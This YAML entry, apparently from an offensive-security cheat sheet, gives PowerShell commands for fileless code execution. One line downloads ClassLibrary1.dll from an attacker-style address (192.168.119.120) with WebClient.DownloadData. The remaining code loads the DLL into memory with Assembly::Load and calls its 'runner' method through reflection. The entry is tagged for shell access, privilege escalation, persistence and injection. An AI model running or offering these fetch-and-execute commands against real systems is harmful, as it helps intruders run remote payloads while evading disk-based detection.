---
description: |
  Use the DownloadData method of the Net.WebClient class to download the DLL as a byte array, and then use the Load function to load the Byte array into memory instead of disk. After the assembly is loaded, we can interact with it using reflection through the GetType and GetMethod methods, and finally call it through the Invoke method.

  Command Reference:
  ```
  DLL: ClassLibrary1.dll

  Byte array with code: $data
  ```
command: |
  $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/ClassLibrary1.dll')

code: |
  $assem = [System.Reflection.Assembly]::Load($data)
  or (for local file)   
  $assem = [System.Reflection.Assembly]::LoadFile("C:\user\documents\ClassLibrary1.dll") 
  $class = $assem.GetType("ClassLibrary1.Class1") 
  $method = $class.GetMethod("runner") 
  $method.Invoke(0, $null)

items:
  - Shell
services:
  - 
OS:
  - Windows
attack_types:
  - PrivEsc
  - Persistence
  - Injection
references:
  - https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-7.0
---